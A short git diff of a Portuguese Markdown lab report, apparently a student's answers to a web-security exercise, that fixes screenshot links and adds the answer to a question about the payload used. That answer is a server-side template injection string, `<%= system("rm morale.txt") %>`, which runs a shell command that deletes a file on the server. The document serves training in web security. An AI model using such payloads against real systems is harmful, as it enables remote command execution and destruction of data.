@@ -50,7 +50,9 @@
 
 <br><br />
 
-<img src="Cp-WEB/print1-exe1.pn">
+<img src="Cp-WEB/print5-exe1.png">
+<img src="Cp-WEB/print5-exe1-2.png">
+<img src="Cp-WEB/print5-exe1-3.png">
 
 ---
 
@@ -58,15 +60,8 @@
 
 <br><br />
 
-<img src="Cp-WEB/print1-exe1.pn">
-
----
-
-7. Forneça o payload utilizado para completar o primeiro laboratório e a evidência que você conseguiu completá-lo.
-
-<br><br />
-
-<img src="Cp-WEB/print1-exe1.pn">
+O payload utilizado foi `<%=%20system("rm%20morale.txt")%20%>`
+<img src="Cp-WEB/print6-exe1.png">
 
 ---
 
